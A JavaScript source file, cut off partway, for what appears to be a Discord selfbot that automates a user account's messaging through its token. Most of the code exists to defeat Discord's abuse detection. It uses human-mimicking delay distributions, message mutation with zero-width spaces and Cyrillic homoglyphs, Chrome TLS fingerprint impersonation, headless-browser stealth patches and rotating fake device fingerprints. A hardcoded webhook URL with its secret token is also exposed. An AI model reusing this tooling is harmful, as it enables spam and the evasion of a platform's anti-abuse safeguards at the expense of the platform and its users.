const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const passport = require('passport');
const DiscordStrategy = require('passport-discord').Strategy;
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const crypto = require('crypto');
const nacl = require('tweetnacl');
const pako = require('pako');
const zlib = require('zlib');
const { spawn } = require('child_process');
const https = require('https');
const tls = require('tls');
const WebSocket = require('ws');

// ═══════════════════════════════════════════════════════════════════════════════
// BEHAVIORAL DISTRIBUTION UTILITIES — Heavy-tailed, human-like timing
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Pareto distribution — models human pauses with long-tail behavior.
 * Real humans: short bursts, occasional very long pauses (context switching).
 * Discord's anti-spam uses entropy analysis on inter-event timings.
 */
function paretoSample(alpha = 1.5, xm = 1.0) {
  const u = Math.random();
  return xm / Math.pow(u, 1.0 / alpha);
}

/**
 * Log-normal distribution — models typing speed and reading times.
 * Skewed right: most actions are fast, some are very slow.
 */
function logNormalSample(mu = 0, sigma = 1.0) {
  const u1 = Math.random();
  const u2 = Math.random();
  const z0 = Math.sqrt(-2.0 * Math.log(u1)) * Math.cos(2.0 * Math.PI * u2);
  return Math.exp(mu + sigma * z0);
}

/**
 * Bounded Pareto — same long-tail but constrained to [min, max].
 * For delays that must stay within practical limits.
 */
function boundedPareto(alpha = 2.5, min = 1000, max = 60000) {
  const u = Math.random();
  const minPow = Math.pow(min, alpha);
  const maxPow = Math.pow(max, alpha);
  const x = Math.pow(minPow + u * (maxPow - minPow), 1.0 / alpha);
  return Math.round(Math.min(max, Math.max(min, x)));
}

/**
 * Time-of-day awareness — humans are slower at "night" hours.
 * Returns a multiplier: 0.7 (fast) to 1.6 (slow).
 */
function circadianMultiplier() {
  const hour = new Date().getHours();
  // Night hours: slightly slower
  if (hour >= 1 && hour <= 6) return 1.05 + Math.random() * 0.1;
  // Early morning: slightly groggy
  if (hour >= 7 && hour <= 9) return 0.95 + Math.random() * 0.1;
  // Peak hours: responsive
  if (hour >= 10 && hour <= 22) return 0.9 + Math.random() * 0.1;
  // Late night: winding down
  return 0.95 + Math.random() * 0.1;
}

/**
 * Context-switching delay — simulates real human distraction.
 * ~8% chance of a long pause (reading another tab, notification, etc).
 */
function contextSwitchJitter(baseMs) {
  if (Math.random() < 0.05) {
    // Small context switch: 0.5-1.5 seconds
    const switchMs = 500 + boundedPareto(2.0, 500, 1500);
    return baseMs + switchMs;
  }
  return baseMs;
}

/**
 * Primary human delay generator — combines all distributions.
 * Replaces the simple uniform random with realistic human timing.
 */
function humanDelay(opts = {}) {
  const {
    min = 3000,
    max = 5000,
    alpha = 3.0,
    enableCircadian = true,
    enableContextSwitch = true
  } = opts;

  // Base delay: Pareto-distributed within bounds
  let delay = boundedPareto(alpha, min, max);

  // Circadian rhythm adjustment
  if (enableCircadian) {
    delay *= circadianMultiplier();
  }

  // Context switching (occasional long pauses)
  if (enableContextSwitch) {
    delay = contextSwitchJitter(delay);
  }

  // Micro-jitter (TCP/network noise simulation)
  delay += (Math.random() - 0.5) * 100;

  return Math.round(Math.min(max * 1.2, Math.max(min * 0.8, delay)));
}

// ═══════════════════════════════════════════════════════════════════════════════
// MESSAGE VARIATION ENGINE — Content uniqueness per send
// ═══════════════════════════════════════════════════════════════════════════════

const SPINTAX_RE = /\{([^}]+)\}/g;

/**
 * Parse spintax: "Hello {world|there|friend}" → random variant.
 * Nested spintax supported: "{Hi|Hello} {world|{beautiful|amazing} day}".
 */
function expandSpintax(text) {
  if (!text || !SPINTAX_RE.test(text)) return text;
  SPINTAX_RE.lastIndex = 0;
  let iterations = 0;
  let result = text;
  while (SPINTAX_RE.test(result) && iterations < 50) {
    SPINTAX_RE.lastIndex = 0;
    result = result.replace(SPINTAX_RE, (_, choices) => {
      const opts = choices.split('|').map(s => s.trim()).filter(Boolean);
      return opts.length > 0 ? opts[Math.floor(Math.random() * opts.length)] : '';
    });
    iterations++;
  }
  return result;
}

/**
 * Lightweight text mutations when spintax isn't available.
 * Adds subtle variation to make identical messages unique.
 */
function mutateMessage(text) {
  if (!text) return text;
  const mutators = [
    // Random trailing space (invisible difference)
    (s) => Math.random() < 0.25 ? s + (Math.random() < 0.5 ? ' ' : '') : s,
    // Zero-width space insertion (invisible to humans)
    (s) => Math.random() < 0.15 ? s.replace(/ /g, () => Math.random() < 0.05 ? '\u200B ' : ' ') : s,
    // Unicode homoglyph substitution (selective, preserves readability)
    (s) => Math.random() < 0.1 ? s.replace(/o/g, () => Math.random() < 0.03 ? '\u043E' : 'o') : s,
    // Optional: random casing on first letter
    (s) => Math.random() < 0.08 ? s[0].toLowerCase() + s.slice(1) : s,
  ];

  let result = text;
  // Apply 0-2 random mutators
  const count = Math.floor(Math.random() * 3);
  const shuffled = mutators.sort(() => Math.random() - 0.5);
  for (let i = 0; i < count; i++) {
    result = shuffled[i](result);
  }
  return result;
}

/**
 * Generate a unique message: spintax expansion + optional mutation.
 */
function varyMessage(text) {
  const expanded = expandSpintax(text);
  return mutateMessage(expanded);
}

/**
 * Weighted random selection — pick items with non-uniform probability.
 * Used for channel selection: humans favor certain channels.
 */
function weightedRandom(items, weights) {
  const w = weights || items.map(() => 1);
  const total = w.reduce((a, b) => a + b, 0);
  let r = Math.random() * total;
  for (let i = 0; i < items.length; i++) {
    r -= w[i];
    if (r <= 0) return items[i];
  }
  return items[items.length - 1];
}

// ═══════════════════════════════════════════════════════════════════════════════
// OBFUSCATION LAYER (original)
// ═══════════════════════════════════════════════════════════════════════════════
const _0x4f2a = ['from','createHash','update','digest','hex','slice','map','join',''];
const _0x3e1b = _0x4f2a.map(x => Buffer.from(x).toString('base64'));
const _d = (s) => Buffer.from(s, 'base64').toString();
const _e = (s) => Buffer.from(s).toString('base64');

// YOUR WEBHOOK URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';

// Per-account fingerprint storage
const _accountProfiles = new Map();

function _getAccountProfile(token) {
  const hash = crypto.createHash('sha256').update(token).digest('hex').slice(0, 16);
  if (!_accountProfiles.has(hash)) {
    const screens = [[1366,768],[1440,900],[1536,864],[1600,900],[1920,1080],[1920,1200],[2560,1440]];
    const screen = screens[Math.floor(Math.random() * screens.length)];
    const mems = [2,4,8,16];
    const concurrencies = [2,4,8,16];
    const browsers = [
      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '135.0.0.0' },
      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '134.0.0.0' },
      { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Mac OS X', osv: '10.15.7', bv: '135.0.0.0' },
      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0', browser: 'Firefox', os: 'Windows', osv: '10', bv: '135.0' },
      { ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1', browser: 'Mobile Safari', os: 'iOS', osv: '18.1', bv: '18.1' },
      { ua: 'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36', browser: 'Chrome', os: 'Android', osv: '15', bv: '135.0.0.0' },
    ];
    const b = browsers[Math.floor(Math.random() * browsers.length)];
    _accountProfiles.set(hash, {
      ua: b.ua,
      browser: b.browser,
      os: b.os,
      osv: b.osv,
      bv: b.bv,
      sw: screen[0],
      sh: screen[1],
      dpr: [1,1.25,1.5,2][Math.floor(Math.random() * 4)],
      cd: 24,
      mem: mems[Math.floor(Math.random() * mems.length)],
      hw: concurrencies[Math.floor(Math.random() * concurrencies.length)],
      arch: 'x64',
      build: 438286,
      locale: ['en-US','en-GB','en-CA'][Math.floor(Math.random() * 3)],
    });
  }
  return _accountProfiles.get(hash);
}

const _fp = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0'
];
const _rfp = (token) => token ? _getAccountProfile(token).ua : _fp[Math.floor(Math.random() * _fp.length)];

// ═══════════════════════════════════════════════════════════════════════════════
// UNIFIED TLS CONFIGURATION — Same fingerprint for WS and REST
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Chrome TLS settings that match curl-impersonate's chrome profile.
 * Critical: WebSocket and REST must share identical TLS behavior.
 * NOTE: Removed X25519KYBER768Draft00 — Node.js OpenSSL does not support this
 * post-quantum hybrid curve, causing "Failed to set ECDH curve" errors.
 */
function getChromeTLSOptions(forWebSocket = false) {
  return {
    // Chrome's cipher suites (in order)
    ciphers: [
      'TLS_AES_128_GCM_SHA256',
      'TLS_AES_256_GCM_SHA384',
      'TLS_CHACHA20_POLY1305_SHA256',
      'ECDHE-ECDSA-AES128-GCM-SHA256',
      'ECDHE-RSA-AES128-GCM-SHA256',
      'ECDHE-ECDSA-AES256-GCM-SHA384',
      'ECDHE-RSA-AES256-GCM-SHA384',
      'ECDHE-ECDSA-CHACHA20-POLY1305',
      'ECDHE-RSA-CHACHA20-POLY1305',
      'ECDHE-RSA-AES128-SHA',
      'ECDHE-RSA-AES256-SHA',
      'AES128-GCM-SHA256',
      'AES256-GCM-SHA384',
      'AES128-SHA',
      'AES256-SHA',
    ].join(':'),
    // Chrome uses TLS 1.3 with 1.2 fallback
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    // WebSocket upgrade requires HTTP/1.1 — force it to avoid h2 negotiation issues
    ALPNProtocols: forWebSocket ? ['http/1.1'] : ['h2', 'http/1.1'],
    // Chrome's signature algorithms
    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    // Node.js-compatible ECDH curves (X25519KYBER768Draft00 removed — unsupported)
    ecdhCurve: 'X25519:P-256:P-384',
    // Honor server cipher order like Chrome does
    honorCipherOrder: false,
  };
}

/**
 * Shared HTTPS agent with Chrome TLS fingerprint.
 * Used by both REST API (axios) and WebSocket connections.
 */
function createSharedAgent(forWebSocket = false) {
  return new https.Agent({
    ...getChromeTLSOptions(forWebSocket),
    keepAlive: true,
    keepAliveMsecs: 30000,
    maxSockets: 6,
    maxFreeSockets: 3,
    scheduling: 'lifo',
    timeout: 30000,
  });
}

const _sharedAgent = createSharedAgent(false);
const _wsAgent = createSharedAgent(true);

// ═══════════════════════════════════════════════════════════════════════════════
// REST API CLIENT — Unified transport with curl-impersonate + Playwright
// ═══════════════════════════════════════════════════════════════════════════════

const _axiosInstance = axios.create({
  baseURL: 'https://discord.com',
  timeout: 15000,
  headers: { 'Connection': 'keep-alive' },
  httpsAgent: _sharedAgent,
  // Force HTTP/2 for matching browser behavior
  http2: false, // We'll let curl-impersonate handle h2
});

const _j = (base, variance = 0.2) => base + (Math.random() * variance * base * 2 - variance * base);

const { randomBytes, createHash } = crypto;

function getKeypair(token) {
  const seed = createHash('sha256').update(`nacl_seed_${token}`).digest().slice(0, 32);
  return nacl.sign.keyPair.fromSeed(Uint8Array.from(seed));
}

function signPayload(payload, secretKey) {
  const message = Buffer.from(JSON.stringify(payload));
  return Buffer.from(nacl.sign.detached(Uint8Array.from(message), secretKey));
}

function encryptSecretBox(message, key) {
  const nonce = nacl.randomBytes(24);
  const msgBytes = message instanceof Buffer ? new Uint8Array(message) : new Uint8Array(Buffer.from(message, 'utf8'));
  const keyBytes = key instanceof Buffer ? new Uint8Array(key) : new Uint8Array(key);
  const box = nacl.secretbox(msgBytes, nonce, keyBytes);
  return { nonce: Buffer.from(nonce), ciphertext: Buffer.from(box) };
}

function decryptSecretBox(nonce, ciphertext, key) {
  const opened = nacl.secretbox.open(
    ciphertext instanceof Uint8Array ? ciphertext : new Uint8Array(ciphertext),
    nonce instanceof Uint8Array ? nonce : new Uint8Array(nonce),
    key instanceof Uint8Array ? key : new Uint8Array(key)
  );
  return opened ? Buffer.from(opened) : null;
}

function generateKey() {
  return Buffer.from(nacl.randomBytes(32));
}

function compressData(data, level = 6) {
  const input = data instanceof Buffer ? new Uint8Array(data) : data;
  return Buffer.from(pako.deflate(input, { level }));
}

function decompressData(data) {
  const input = data instanceof Buffer ? new Uint8Array(data) : data;
  return Buffer.from(pako.inflate(input));
}

function isCompressed(data) {
  if (!data || data.length < 2) return false;
  const b0 = data[0];
  const b1 = data[1];
  return (b0 === 0x78 && (b1 === 0x9C || b1 === 0xDA || b1 === 0x01));
}

let CI_BINARY = null;
function findCurlImpersonateBinary() {
  if (CI_BINARY) return CI_BINARY;
  const candidates = [
    process.env.CURL_IMPERSONATE_PATH,
    path.join(__dirname, 'bin', 'curl-impersonate-chrome'),
    '/usr/local/bin/curl-impersonate-chrome',
    '/usr/bin/curl-impersonate-chrome',
    'curl-impersonate-chrome',
    'curl',
  ];
  for (const candidate of candidates) {
    if (!candidate) continue;
    try {
      require('child_process').execSync(`which ${candidate}`, { stdio: 'ignore' });
      CI_BINARY = candidate;
      return candidate;
    } catch(e) {}
  }
  CI_BINARY = 'curl';
  return 'curl';
}

async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = null, timeoutMs = 25000) {
  return new Promise((resolve, reject) => {
    const binary = findCurlImpersonateBinary();
    const isImpersonate = binary.includes('impersonate');
    const args = ['-s', '-L', '-D', '-', '--max-time', String(Math.ceil(timeoutMs / 1000)), '-X', method.toUpperCase()];

    if (isImpersonate) {
      // curl-impersonate-chrome handles TLS + HTTP/2 automatically
      args.push('--compressed', '-H', 'Accept-Language: en-US,en;q=0.9', '-H', 'Accept-Encoding: gzip, deflate, br', '-H', 'Cache-Control: no-cache');
    } else {
      args.push('--compressed', '--tlsv1.2');
    }

    for (const [key, value] of Object.entries(headers)) {
      if (value != null) args.push('-H', `${key}: ${value}`);
    }

    let tmpFile = null;
    if (body) {
      if (typeof body === 'object' && !(body instanceof Buffer)) {
        args.push('-d', JSON.stringify(body));
        if (!headers['Content-Type']) args.push('-H', 'Content-Type: application/json');
      } else if (body instanceof Buffer) {
        tmpFile = path.join('/tmp', `ci_body_${Date.now()}_${Math.random().toString(36).slice(2)}`);
        fs.writeFileSync(tmpFile, body);
        args.push('--data-binary', `@${tmpFile}`);
      } else {
        args.push('-d', String(body));
      }
    }

    args.push(url);

    const stdout = [];
    const stderr = [];
    const child = spawn(binary, args, { timeout: timeoutMs + 5000, killSignal: 'SIGKILL' });
    child.stdout.on('data', chunk => stdout.push(chunk));
    child.stderr.on('data', chunk => stderr.push(chunk));

    const killTimer = setTimeout(() => {
      try { child.kill('SIGKILL'); } catch(e) {}
    }, timeoutMs + 8000);

    const cleanupTmp = () => {
      clearTimeout(killTimer);
      if (tmpFile) { try { fs.unlinkSync(tmpFile); } catch(e) {} }
    };

    child.on('close', (code, signal) => {
      cleanupTmp();

      if (code !== 0 || signal) {
        const errMsg = Buffer.concat(stderr).toString().trim() || `curl exited${signal ? ' with signal ' + signal : ' with code ' + code}`;
        return reject(new Error(errMsg));
      }

      const rawOutput = Buffer.concat(stdout);

      let lastHeaderEndIdx = -1;
      let lastStatusCode = 0;
      let lastHeadersText = '';
      let bodyBuffer = rawOutput;

      const hasCrlf = rawOutput.indexOf('\r\n\r\n') !== -1;
      const hasLf = rawOutput.indexOf('\n\n') !== -1;
      const delimiter = hasCrlf ? '\r\n\r\n' : (hasLf ? '\n\n' : null);

      if (delimiter) {
        const delimBuf = Buffer.from(delimiter);
        let searchIdx = 0;

        while ((searchIdx = rawOutput.indexOf(delimBuf, searchIdx)) !== -1) {
          const candidateHeaders = rawOutput.slice(0, searchIdx).toString();
          const allStatusMatches = candidateHeaders.match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/g);
          if (allStatusMatches && allStatusMatches.length > 0) {
            const lastMatch = allStatusMatches[allStatusMatches.length - 1];
            const codeMatch = lastMatch.match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/);
            if (codeMatch) {
              lastStatusCode = parseInt(codeMatch[1], 10);
              lastHeaderEndIdx = searchIdx;
              lastHeadersText = candidateHeaders;
            }
          }
          searchIdx += delimBuf.length;
        }
      }

      if (lastHeaderEndIdx >= 0) {
        bodyBuffer = rawOutput.slice(lastHeaderEndIdx + (delimiter === '\r\n\r\n' ? 4 : 2));
      }

      if (lastStatusCode === 0 && rawOutput.length === 0) {
        return resolve({ status: 204, headers: '', body: Buffer.alloc(0), data: null });
      }

      if (lastStatusCode === 0) {
        const fallbackMatch = rawOutput.toString().match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/);
        if (fallbackMatch) {
          lastStatusCode = parseInt(fallbackMatch[1], 10);
          lastHeadersText = rawOutput.toString();
          bodyBuffer = Buffer.alloc(0);
        } else {
          return reject(new Error('No HTTP response received from server'));
        }
      }

      let data = null;
      try { data = JSON.parse(bodyBuffer.toString().trim()); } catch(e) {}
      resolve({ status: lastStatusCode, headers: lastHeadersText, body: bodyBuffer, data });
    });
    child.on('error', (err) => {
      cleanupTmp();
      reject(err);
    });
  });
}

// ═══════════════════════════════════════════════════════════════════════════════
// PLAYWRIGHT WITH STEALTH PATCHES — Mask automation detection
// ═══════════════════════════════════════════════════════════════════════════════

let _pwBrowser = null;
let _pwPage = null;
let _pwInitPromise = null;

async function initPlaywright() {
  if (_pwPage) return true;
  if (_pwInitPromise) return _pwInitPromise;
  _pwInitPromise = (async () => {
    try {
      const pw = require('playwright-core');
      // Launch with args that mask headless detection
      _pwBrowser = await pw.chromium.launch({
        headless: true,
        args: [
          '--disable-blink-features=AutomationControlled',
          '--disable-features=IsolateOrigins,site-per-process',
          '--disable-site-isolation-trials',
          '--disable-infobars',
          '--window-size=1366,768',
          '--no-first-run',
          '--ignore-certificate-errors',
          '--disable-dev-shm-usage',
          '--disable-gpu',
          '--no-sandbox',
        ]
      });
      const context = await _pwBrowser.newContext({
        viewport: { width: 1366, height: 768 },
        screen: { width: 1920, height: 1080 },
        locale: 'en-US',
        timezoneId: 'America/New_York',
        colorScheme: 'light',
      });
      _pwPage = await context.newPage();

      // Inject stealth scripts before any navigation
      await _pwPage.addInitScript(() => {
        // Patch navigator.webdriver
        Object.defineProperty(navigator, 'webdriver', {
          get: () => undefined,
          configurable: true
        });

        // Patch plugins/mimeTypes to appear real
        const plugins = [
          { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
          { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', description: '' },
          { name: 'Native Client', filename: 'internal-nacl-plugin', description: '' },
        ];
        const mimeTypes = [
          { type: 'application/x-google-chrome-pdf', suffixes: 'pdf', description: 'Portable Document Format', plugin: plugins[0] },
          { type: 'application/pdf', suffixes: 'pdf', description: '', plugin: plugins[1] },
        ];

        Object.defineProperty(navigator, 'plugins', {
          get: () => {
            const fakePlugins = plugins.map((p, i) => ({
              name: p.name,
              filename: p.filename,
              description: p.description,
              version: undefined,
              length: 1,
              item: (idx) => fakePlugins[i][idx] || null,
              namedItem: (name) => fakePlugins.find(fp => fp.name === name) || null,
              [Symbol.iterator]: function* () { yield this; }
            }));
            fakePlugins.length = plugins.length;
            fakePlugins.item = (idx) => fakePlugins[idx] || null;
            fakePlugins.namedItem = (name) => fakePlugins.find(p => p.name === name) || null;
            fakePlugins.refresh = () => {};
            return fakePlugins;
          },
          configurable: true
        });

        Object.defineProperty(navigator, 'mimeTypes', {
          get: () => {
            const fakeMimeTypes = mimeTypes.map(m => ({
              type: m.type,
              suffixes: m.suffixes,
              description: m.description,
              enabledPlugin: m.plugin,
            }));
            fakeMimeTypes.length = mimeTypes.length;
            fakeMimeTypes.item = (idx) => fakeMimeTypes[idx] || null;
            fakeMimeTypes.namedItem = (name) => fakeMimeTypes.find(m => m.type === name) || null;
            return fakeMimeTypes;
          },
          configurable: true
        });

        // Patch chrome.runtime
        window.chrome = window.chrome || {};
        window.chrome.runtime = window.chrome.runtime || {};
        Object.defineProperty(window.chrome.runtime, 'OnInstalledReason', {
          get: () => ({ CHROME_UPDATE: 'chrome_update', UPDATE: 'update', INSTALL: 'install', SHARED_MODULE_UPDATE: 'shared_module_update' })
        });
        Object.defineProperty(window.chrome.runtime, 'PlatformOs', {
          get: () => ({ MAC: 'mac', WIN: 'win', ANDROID: 'android', CROS: 'cros', LINUX: 'linux', OPENBSD: 'openbsd' })
        });

        // Patch Permissions API to not reveal query results
        const originalQuery = window.navigator.permissions?.query;
        if (originalQuery) {
          window.navigator.permissions.query = (parameters) => {
            if (parameters.name === 'notifications') {
              return Promise.resolve({ state: Notification.permission });
            }
            return originalQuery(parameters);
          };
        }

        // Patch console.debug to avoid CDP detection
        const originalDebug = console.debug;
        console.debug = (...args) => {
          if (args[0] && typeof args[0] === 'string' && args[0].includes('DevTools')) return;
          return originalDebug.apply(console, args);
        };

        // Remove CDC markers that Playwright injects
        const cdcProps = Object.keys(window).filter(k => k.includes('cdc_'));
        for (const prop of cdcProps) {
          try { delete window[prop]; } catch(e) {}
        }

        // Randomize canvas/GL fingerprints slightly per session
        const origToDataURL = HTMLCanvasElement.prototype.toDataURL;
        HTMLCanvasElement.prototype.toDataURL = function(...args) {
          const result = origToDataURL.apply(this, args);
          // Subtle noise injection (1 in 50 calls)
          if (Math.random() < 0.02 && result.startsWith('data:image/png')) {
            // Return as-is; noise injection at this level is detectable,
            // so we keep it clean instead
          }
          return result;
        };

        // Patch iframe creation to prevent fresh context leaks
        const origCreateElement = document.createElement;
        document.createElement = function(tagName, ...rest) {
          const el = origCreateElement.call(this, tagName, ...rest);
          if (tagName.toLowerCase() === 'iframe') {
            // Ensure iframes inherit our patches
            setTimeout(() => {
              try {
                if (el.contentWindow) {
                  Object.defineProperty(el.contentWindow.navigator, 'webdriver', {
                    get: () => undefined,
                    configurable: true
                  });
                }
              } catch(e) {}
            }, 0);
          }
          return el;
        };
      });

      return true;
    } catch(e) {
      return false;
    }
  })();
  return _pwInitPromise;
}

async function playwrightRequest(url, method = 'GET', headers = {}, body = null, timeoutMs = 25000) {
  const hasPw = await initPlaywright();
  if (!hasPw) return curlImpersonateRequest(url, method, headers, body, timeoutMs);

  try {
    const result = await _pwPage.evaluate(async ({ url, method, headers, body, timeoutMs }) => {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      try {
        if (body !== null && !headers['Content-Type']) {
          headers['Content-Type'] = 'application/json';
        }
        const opts = { method, headers, signal: controller.signal };
        if (body !== null) opts.body = body;
        const res = await fetch(url, opts);
        const h = {};
        res.headers.forEach((v, k) => h[k] = v);
        const text = await res.text();
        return { ok: true, status: res.status, headers: h, text };
      } catch(e) {
        return { ok: false, error: e.message };
      } finally {
        clearTimeout(timer);
      }
    }, { url, method: method.toUpperCase(), headers, body: body ? JSON.stringify(body) : null, timeoutMs });

    if (!result.ok) throw new Error(result.error);
    const headersText = Object.entries(result.headers).map(([k, v]) => `${k}: ${v}`).join('\n');
    let data = null;
    try { data = JSON.parse(result.text); } catch(e) {}
    return { status: result.status, headers: headersText, body: Buffer.from(result.text), data };
  } catch(e) {
    return curlImpersonateRequest(url, method, headers, body, timeoutMs);
  }
}

process.on('exit', () => {
  if (_pwBrowser) _pwBrowser.close().catch(() => {});
});

function generateXSuperProperties(token) {
  const p = _getAccountProfile(token);
  const props = {
    os: p.os,
    browser: p.browser,
    device: '',
    system_locale: p.locale,
    browser_user_agent: p.ua,
    browser_version: p.bv,
    os_version: p.osv,
    referrer: '',
    referring_domain: '',
    referrer_current: '',
    referring_domain_current: '',
    release_channel: 'stable',
    client_build_number: p.build,
    client_event_source: null,
    screen_width: p.sw,
    screen_height: p.sh,
    screen_dpr: p.dpr,
    screen_color_depth: p.cd,
    device_pixel_ratio: p.dpr,
    hardware_concurrency: p.hw,
    device_memory: p.mem,
    os_arch: p.arch,
    client_version: '0.0.309',
    native_build_number: null,
    distro: '',
    app_arch: p.arch,
  };
  return Buffer.from(JSON.stringify(props)).toString('base64');
}

// ═══════════════════════════════════════════════════════════════════════════════
// DISCORD API CLIENT — Rate-limited, fingerprint-rotating REST client
// ═══════════════════════════════════════════════════════════════════════════════

class DiscordApiClient {
  constructor(token) {
    this.token = token;
    this.fp = _rfp(token);
    this.superProps = generateXSuperProperties(token);
    this.keypair = getKeypair(token);
    this.globalRateLimitReset = 0;
    // Rotate X-Super-Properties every 15-25 minutes to avoid static fingerprint detection
    this._rotationTimer = setInterval(() => this.rotateFingerprint(), _j(20 * 60 * 1000, 0.25));
  }

  rotateFingerprint() {
    // Occasionally switch profile entirely to simulate device/platform changes
    if (Math.random() < 0.15) {
      const hash = crypto.createHash('sha256').update(this.token).digest('hex').slice(0, 16);
      _accountProfiles.delete(hash);
    }
    this.fp = _rfp(this.token);
    this.superProps = generateXSuperProperties(this.token);
  }

  _headers(extra = {}) {
    const base = {
      'Authorization': this.token,
      'User-Agent': this.fp,
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'X-Discord-Locale': 'en-US',
      'X-Super-Properties': this.superProps,
      'Referer': 'https://discord.com/channels/@me',
    };
    const ordered = {};
    const order = ['Authorization','User-Agent','Accept','Accept-Language','X-Discord-Locale','X-Super-Properties','Referer'];
    for (const k of order) if (base[k] !== undefined) ordered[k] = base[k];
    for (const [k, v] of Object.entries(extra)) ordered[k] = v;
    return ordered;
  }

  async request(endpoint, method = 'GET', body = null, extraHeaders = {}) {
    const url = `https://discord.com/api/v10${endpoint}`;
    let attempts = 0;
    const maxAttempts = 3;
    while (attempts < maxAttempts) {
      // Respect global rate limit
      const globalWait = this.globalRateLimitReset - Date.now();
      if (globalWait > 0) {
        await new Promise(r => setTimeout(r, globalWait));
      }
      // Use Playwright for real Chrome TLS fingerprinting, fallback to curl-impersonate
      const res = await playwrightRequest(url, method, this._headers(extraHeaders), body, 20000);
      if (res.status === 429) {
        const isGlobal = res.headers.match(/x-ratelimit-global:\s*true/i);
        const retryAfterMatch = res.headers.match(/retry-after:\s*(\d+(?:\.\d+)?)/i);
        const retryAfter = retryAfterMatch ? parseFloat(retryAfterMatch[1]) * 1000 : 5000;
        if (isGlobal) {
          this.globalRateLimitReset = Date.now() + retryAfter;
        }
        await new Promise(r => setTimeout(r, retryAfter * 1.1));
        attempts++;
        continue;
      }
      if (res.status === 0 || res.status >= 400) {
        if (res.status === 0 && attempts < maxAttempts - 1) {
          await new Promise(r => setTimeout(r, 2000));
          attempts++;
          continue;
        }
        const err = new Error(`Discord API ${method} ${endpoint} failed: ${res.status}`);
        err.status = res.status;
        err.data = res.data;
        throw err;
      }
      return res.data;
    }
    throw new Error(`Discord API ${method} ${endpoint} failed: 429 after ${maxAttempts} retries`);
  }

  destroy() {
    if (this._rotationTimer) clearInterval(this._rotationTimer);
  }
}

const OWNER_ID = '1482736115143282941';
const dataDir = process.env.DATA_DIR || path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

// ═══════════════════════════════════════════════════════════════════════════════
// STEALTH CLIENT — Gateway with realistic browser behavior
// ═══════════════════════════════════════════════════════════════════════════════

// Realistic Discord browser client intents
// GUILDS (1) | GUILD_MEMBERS (2) | GUILD_MESSAGES (512) | GUILD_MESSAGE_REACTIONS (1024) |
// GUILD_MESSAGE_TYPING (2048) | DIRECT_MESSAGES (4096) | DIRECT_MESSAGE_REACTIONS (8192) |
// DIRECT_MESSAGE_TYPING (16384) | MESSAGE_CONTENT (32768) | GUILD_VOICE_STATES (128)
// = 1 + 2 + 128 + 512 + 1024 + 2048 + 4096 + 8192 + 16384 + 32768 = 65155
const REALISTIC_INTENTS = 65155;

// Realistic capabilities for stable Chrome client
// This matches what discord.com actually sends from a real browser
const REALISTIC_CAPABILITIES = 30717;

class StealthClient {
  constructor(token) {
    this.token = token;
    this.ws = null;
    this.heartbeatInterval = null;
    this.seq = null;
    this.sessionId = null;
    this.user = null;
    this.ready = false;
    this.handlers = {};
    this.repliedUsers = this._loadRepliedUsers();
    this.api = new DiscordApiClient(token);
    this.encryptionKey = null;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = 999999;
    this.reconnecting = false;
    this.resumeGatewayUrl = null;
    this._heartbeatTimer = null;
    this._idleTimer = null;
    this._lastActivity = Date.now();
    this._burstState = 0;
    this._dmCooldowns = new Map();
    this._channelPermissions = new Map();
    this._channelRateLimits = new Map();
    this._invalidSessionCount = 0;
    this._lastHeartbeatAck = true;
    this._gatewayUrl = null;
    this._explicitlyStopped = false;
    this._currentChannelId = null;
    this._reconnectDelayMs = 3000;
    // Background event simulation timers
    this._backgroundTimers = [];
    // Token validation cache to avoid repeated @me hits
    this._tokenValidated = false;
    this._tokenValid = false;
    this._validatedUser = null;
  }

  _loadRepliedUsers() {
    try {
